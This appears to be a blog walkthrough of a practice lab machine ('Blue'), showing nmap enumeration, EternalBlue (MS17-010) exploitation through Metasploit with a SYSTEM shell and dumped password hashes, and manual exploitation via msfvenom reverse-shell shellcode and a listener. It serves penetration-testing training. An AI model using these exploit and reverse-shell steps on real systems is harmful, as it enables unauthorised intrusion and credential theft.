---
layout: post
title: Blue: Walkthrough
date: 2024-01-08 00:00 +0000
categories: [CTF, Others]
tags: [nmap,msfconsole,manual exploit,eternal blue,ms-17,meterpreter,metasploit]
---

![eternalblue](https://images-wixmp-ed30a86b8c4ca887773594c2.wixmp.com/i/0753f808-2932-457b-878b-496bbfa2a582/d3amo06-a791928b-c0cc-4405-8934-f4adb24495ca.png/v1/fit/w_640,h_480,q_70,strp/bluescreen_by_yanomami_d3amo06-375w-2x.jpg)

# Summary

This machine is a replica of the well known box called `Blue` on **TryHackme** and **Hack The Box**. 
It was created by **TCM Security** for their Practical Ethical Hacking course and the experience is more **practical** rather than ctf oriented. 

# Scanning & Enumeration

## Nmap

```bash
nmap -T4 -A -p- -oA /home/kali/Blue/nmap 10.0.2.8
```

```bash
# Nmap 7.94SVN scan initiated Mon Jan  8 04:19:19 2024 as: nmap -T4 -A -p- -oA /home/kali/Blue/nmap 10.0.2.8
Nmap scan report for 10.0.2.8
Host is up (0.0010s latency).
Not shown: 65527 closed tcp ports (reset)
PORT      STATE SERVICE      VERSION
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds Windows 7 Ultimate 7601 Service Pack 1 microsoft-ds (workgroup: WORKGROUP)
49152/tcp open  msrpc        Microsoft Windows RPC
49153/tcp open  msrpc        Microsoft Windows RPC
49154/tcp open  msrpc        Microsoft Windows RPC
49155/tcp open  msrpc        Microsoft Windows RPC
49157/tcp open  msrpc        Microsoft Windows RPC
MAC Address: 08:00:27:88:87:AB (Oracle VirtualBox virtual NIC)
Device type: general purpose
Running: Microsoft Windows 7|2008|8.1
OS CPE: cpe:/o:microsoft:windows_7::- cpe:/o:microsoft:windows_7::sp1 cpe:/o:microsoft:windows_server_2008::sp1 cpe:/o:microsoft:windows_server_2008:r2 cpe:/o:microsoft:windows_8 cpe:/o:microsoft:windows_8.1
OS details: Microsoft Windows 7 SP0 - SP1, Windows Server 2008 SP1, Windows Server 2008 R2, Windows 8, or Windows 8.1 Update 1
Network Distance: 1 hop
Service Info: Host: WIN-845Q99OO4PP; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2024-01-08T09:20:48
|_  start_date: 2024-01-08T09:11:19
| smb-os-discovery: 
|   OS: Windows 7 Ultimate 7601 Service Pack 1 (Windows 7 Ultimate 6.1)
|   OS CPE: cpe:/o:microsoft:windows_7::sp1
|   Computer name: WIN-845Q99OO4PP
|   NetBIOS computer name: WIN-845Q99OO4PP\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2024-01-08T04:20:48-05:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
|_clock-skew: mean: 1h40m09s, deviation: 2h53m12s, median: 9s
|_nbstat: NetBIOS name: WIN-845Q99OO4PP, NetBIOS user: <unknown>, NetBIOS MAC: 08:00:27:88:87:ab (Oracle VirtualBox virtual NIC)
| smb2-security-mode: 
|   2:1:0: 
|_    Message signing enabled but not required

TRACEROUTE
HOP RTT     ADDRESS
1   1.01 ms 10.0.2.8

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Mon Jan  8 04:20:43 2024 -- 1 IP address (1 host up) scanned in 84.24 seconds
```

Findings:

- From our nmap scan, port `139` and `445` (SMB) are the only ports imperative to go after for now.

- Target is running `Microsoft Windows 7 2008 8.1`

- We found that this windows verison is likely vulnerable to an exploit called `EternalBlue' SMB Remote Code Execution (MS17-010)`, based on our enumeration on google. [See here](https://www.exploit-db.com/exploits/42315)

*[Image: enumeration]*

## Metasploit: SMB version confirmation

```bash
msf6 auxiliary(scanner/smb/smb_version) > set rhosts 10.0.2.8
rhosts => 10.0.2.8
msf6 auxiliary(scanner/smb/smb_version) > run

[*] 10.0.2.8:445          - SMB Detected (versions:1, 2) (preferred dialect:SMB 2.1) (signatures:optional) (uptime:16m 18s) (guid:{3733640e-ea27-4d3a-81c7-0d44167486d0}) (authentication domain:WIN-845Q99OO4PP)Windows 7 Ultimate SP1 (build:7601) (name:WIN-845Q99OO4PP)
[+] 10.0.2.8:445          -   Host is running SMB Detected (versions:1, 2) (preferred dialect:SMB 2.1) (signatures:optional) (uptime:16m 18s) (guid:{3733640e-ea27-4d3a-81c7-0d44167486d0}) (authentication domain:WIN-845Q99OO4PP)Windows 7 Ultimate SP1 (build:7601) (name:WIN-845Q99OO4PP)
[*] 10.0.2.8:             - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```

### Verification of our Target being vulnerable to eternalblue exploit

```bash
msf6 exploit(windows/smb/ms17_010_eternalblue) > use auxiliary/scanner/smb/smb_ms17_010
msf6 auxiliary(scanner/smb/smb_ms17_010) > set rhosts 10.0.2.8
rhosts => 10.0.2.8
msf6 auxiliary(scanner/smb/smb_ms17_010) > run

[+] 10.0.2.8:445          - Host is likely VULNERABLE to MS17-010! - Windows 7 Ultimate 7601 Service Pack 1 x64 (64-bit)
[*] 10.0.2.8:445          - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```

## Exploitation

After confirming that our target is likely vulnerable to **eternalblue**, we used the ms17_010_eternalblue exploit from `metasploit` 
and we were able to pop a shell as the root user (**nt authority\system**). 

We were also able to dump the hashes on the machine, which we could take offline and crack with `John the ripper` or `hashcat`.

### Msfconsole: 

```bash
msf6 > use exploit/windows/smb/ms17_010_eternalblue
[*] No payload configured, defaulting to windows/x64/meterpreter/reverse_tcp
msf6 exploit(windows/smb/ms17_010_eternalblue) > options

Module options (exploit/windows/smb/ms17_010_eternalblue):

   Name           Current Setting  Required  Description
   ----           ---------------  --------  -----------
   RHOSTS                          yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
   RPORT          445              yes       The target port (TCP)
   SMBDomain                       no        (Optional) The Windows domain to use for authentication. Only affects Windows Server 2008 R2, Windows 7, Windows Embedd
                                             ed Standard 7 target machines.
   SMBPass                         no        (Optional) The password for the specified username
   SMBUser                         no        (Optional) The username to authenticate as
   VERIFY_ARCH    true             yes       Check if remote architecture matches exploit Target. Only affects Windows Server 2008 R2, Windows 7, Windows Embedded S
                                             tandard 7 target machines.
   VERIFY_TARGET  true             yes       Check if remote OS matches exploit Target. Only affects Windows Server 2008 R2, Windows 7, Windows Embedded Standard 7
                                             target machines.

Payload options (windows/x64/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     10.0.2.18        yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port

Exploit target:

   Id  Name
   --  ----
   0   Automatic Target

View the full module info with the info, or info -d command.

msf6 exploit(windows/smb/ms17_010_eternalblue) > set rhosts 10.0.2.8
rhosts => 10.0.2.8

msf6 exploit(windows/smb/ms17_010_eternalblue) > run

[*] Started reverse TCP handler on 10.0.2.18:4444
[*] 10.0.2.8:445 - Using auxiliary/scanner/smb/smb_ms17_010 as check
[+] 10.0.2.8:445          - Host is likely VULNERABLE to MS17-010! - Windows 7 Ultimate 7601 Service Pack 1 x64 (64-bit)
[*] 10.0.2.8:445          - Scanned 1 of 1 hosts (100% complete)
[+] 10.0.2.8:445 - The target is vulnerable.
[*] 10.0.2.8:445 - Connecting to target for exploitation.
[+] 10.0.2.8:445 - Connection established for exploitation.
[+] 10.0.2.8:445 - Target OS selected valid for OS indicated by SMB reply
[*] 10.0.2.8:445 - CORE raw buffer dump (38 bytes)
[*] 10.0.2.8:445 - 0x00000000  57 69 6e 64 6f 77 73 20 37 20 55 6c 74 69 6d 61  Windows 7 Ultima
[*] 10.0.2.8:445 - 0x00000010  74 65 20 37 36 30 31 20 53 65 72 76 69 63 65 20  te 7601 Service
[*] 10.0.2.8:445 - 0x00000020  50 61 63 6b 20 31                                Pack 1
[+] 10.0.2.8:445 - Target arch selected valid for arch indicated by DCE/RPC reply
[*] 10.0.2.8:445 - Trying exploit with 12 Groom Allocations.
[*] 10.0.2.8:445 - Sending all but last fragment of exploit packet
[*] 10.0.2.8:445 - Starting non-paged pool grooming
[+] 10.0.2.8:445 - Sending SMBv2 buffers
[+] 10.0.2.8:445 - Closing SMBv1 connection creating free hole adjacent to SMBv2 buffer.
[*] 10.0.2.8:445 - Sending final SMBv2 buffers.
[*] 10.0.2.8:445 - Sending last fragment of exploit packet!
[*] 10.0.2.8:445 - Receiving response from exploit packet
[+] 10.0.2.8:445 - ETERNALBLUE overwrite completed successfully (0xC000000D)!
[*] 10.0.2.8:445 - Sending egg to corrupted connection.
[*] 10.0.2.8:445 - Triggering free of corrupted buffer.
[*] Sending stage (200774 bytes) to 10.0.2.8
[*] Meterpreter session 1 opened (10.0.2.18:4444 -> 10.0.2.8:49158) at 2024-01-08 04:31:05 -0500
[+] 10.0.2.8:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[+] 10.0.2.8:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-WIN-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[+] 10.0.2.8:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=

meterpreter > hostname
[-] Unknown command: hostname
meterpreter > shell
Process 2528 created.
Channel 1 created.
Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\Windows\system32>whoami
whoami
nt authority\system

meterpreter > hashdump
Administrator:500:aad3b435b51404eeaad3b435b51404ee:58f5081696f366cdc72491a2c4996bd5:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
HomeGroupUser$:1002:aad3b435b51404eeaad3b435b51404ee:f580a1940b1f6759fbdd9f5c482ccdbb:::
user:1000:aad3b435b51404eeaad3b435b51404ee:2b576acbe6bcfda7294d6bd18041b8fe:::
```

### Manual exploitation

We did a quick search on google and found this detailed walkthrough on how to exploit **ms-17** without metasploit. [See here](https://github.com/3ndG4me/AutoBlue-MS17-010)

*[Image: exploit]*

Note: Clone the exploit to your attacker machine and follow the installation guideline in the repo.

> The exploit has a script to check if our target is potentially vulnerable

```bash
python eternal_checker.py <TARGET-IP>
```

*[Image: checker]*

**Important note**: In a real world pentest assessment, don't run any exploit in critical environments such as hospitals. Therefore, before running any exploit on a machine you don't know, ask your client first to know if its safe or not. So you don't endanger human lives or cause Denial of service to critical infrastructure or services.

Then we followed the `usage` guideline in the repo:

```bash
sudo ./shell_prep.sh
```

```bash
┌──(kali㉿kali)-[/opt/AutoBlue-MS17-010/shellcode]
└─$ sudo ./shell_prep.sh
[sudo] password for kali:
                 _.-;;-._
          '-..-'|   ||   |
          '-..-'|_.-;;-._|
          '-..-'|   ||   |
          '-..-'|_.-''-._|
Eternal Blue Windows Shellcode Compiler

Let's compile them windoos shellcodezzz

Compiling x64 kernel shellcode
Compiling x86 kernel shellcode
kernel shellcode compiled, would you like to auto generate a reverse shell with msfvenom? (Y/n)
y
LHOST for reverse connection:
10.0.2.18
LPORT you want x64 to listen on:
9999
LPORT you want x86 to listen on:
2222
Type 0 to generate a meterpreter shell or 1 to generate a regular cmd shell
1
Type 0 to generate a staged payload or 1 to generate a stageless payload
0
Generating x64 cmd shell (staged)...

msfvenom -p windows/x64/shell/reverse_tcp -f raw -o sc_x64_msf.bin EXITFUNC=thread LHOST=10.0.2.18 LPORT=9999
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 511 bytes
Saved as: sc_x64_msf.bin

Generating x86 cmd shell (staged)...

msfvenom -p windows/shell/reverse_tcp -f raw -o sc_x86_msf.bin EXITFUNC=thread LHOST=10.0.2.18 LPORT=2222
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder specified, outputting raw payload
Payload size: 375 bytes
Saved as: sc_x86_msf.bin

MERGING SHELLCODE WOOOO!!!
DONE
```

#### Setting up a shell listner

```bash
┌──(kali㉿kali)-[/opt/AutoBlue-MS17-010]
└─$ sudo ./listener_prep.sh
  __
  /,-
  ||)
  \\_, )
   `--'
Eternal Blue Metasploit Listener

LHOST for reverse connection:
10.0.2.18
LPORT for x64 reverse connection:
9999
LPORT for x86 reverse connection:
2222
Enter 0 for meterpreter shell or 1 for regular cmd shell:
1
Type 0 if this is a staged payload or 1 if it is for a stageless payload: 0
Starting listener (staged)...
Starting postgresql (via systemctl): postgresql.service.
Metasploit tip: Enable verbose logging with set VERBOSE true

  +-------------------------------------------------------+
  |  METASPLOIT by Rapid7                                 |
  +---------------------------+---------------------------+
  |      __________________   |                           |
  |  ==c(______(o(______(_()  | |""""""""""""|======[***  |
  |             )=\           | |  EXPLOIT   \            |
  |            // \\          | |_____________\_______    |
  |           //   \\         | |==[msf >]============\   |
  |          //     \\        | |______________________\  |
  |         // RECON \\       | \(@)(@)(@)(@)(@)(@)(@)/   |
  |        //         \\      |  *********************    |
  +---------------------------+---------------------------+
  |      o O o                |        \'\/\/\/'/         |
  |              o O          |         )======(          |
  |                 o         |       .'  LOOT  '.        |
  | |^^^^^^^^^^^^^^|l___      |      /    _||__   \       |
  | |    PAYLOAD     |""\___, |     /    (_||_     \      |
  | |________________|__|)__| |    |     __||_)     |     |
  | |(@)(@)"""**|(@)(@)**|(@) |    "       ||       "     |
  |  = = = = = = = = = = = =  |     '--------------'      |
  +---------------------------+---------------------------+

       =[ metasploit v6.3.49-dev                          ]
+ -- --=[ 2383 exploits - 1235 auxiliary - 417 post       ]
+ -- --=[ 1391 payloads - 46 encoders - 11 nops           ]
+ -- --=[ 9 evasion                                       ]

Metasploit Documentation: https://docs.metasploit.com/

[*] Processing config.rc for ERB directives.
resource (config.rc)> use exploit/multi/handler
[*] Using configured payload generic/shell_reverse_tcp
resource (config.rc)> set PAYLOAD windows/x64/shell/reverse_tcp
PAYLOAD => windows/x64/shell/reverse_tcp
resource (config.rc)> set LHOST 10.0.2.18
LHOST => 10.0.2.18
resource (config.rc)> set LPORT 9999
LPORT => 9999
resource (config.rc)> set ExitOnSession false
ExitOnSession => false
resource (config.rc)> set EXITFUNC thread
EXITFUNC => thread
resource (config.rc)> exploit -j
[*] Exploit running as background job 0.
[*] Exploit completed, but no session was created.
resource (config.rc)> set PAYLOAD windows/shell/reverse_tcp
[*] Started reverse TCP handler on 10.0.2.18:9999
PAYLOAD => windows/shell/reverse_tcp
resource (config.rc)> set LPORT 2222
LPORT => 2222
resource (config.rc)> exploit -j
[*] Exploit running as background job 1.
[*] Exploit completed, but no session was created.

[*] Started reverse TCP handler on 10.0.2.18:2222
msf6 exploit(multi/handler) >
```

#### Fire up the exploit

```bash
python eternalblue_exploit7.py <TARGET-IP> <PATH/TO/SHELLCODE/sc_all.bin> <Number of Groom Connections (optional)>
```

#### Outcome

Our target crashed, hence why we shouldn't just run any exploit in a real world environment without asking the client for permission to know if the target is a critical machine or infrastructure.

*[Image: kali]*

*[Image: windows]*

